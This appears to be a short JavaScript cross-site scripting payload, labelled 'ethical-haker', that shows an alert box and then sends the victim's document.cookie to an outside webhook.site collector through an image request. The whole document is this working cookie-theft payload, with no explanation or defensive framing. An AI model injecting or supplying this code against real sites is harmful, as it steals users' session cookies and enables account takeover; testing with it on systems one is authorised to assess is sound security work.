alert("XSS - ethical-haker");
new Image().src = "https://webhook.site/66e746ee-1738-4e81-8a1c-28d729ae6f31/?cookie=" + encodeURIComponent(document.cookie);
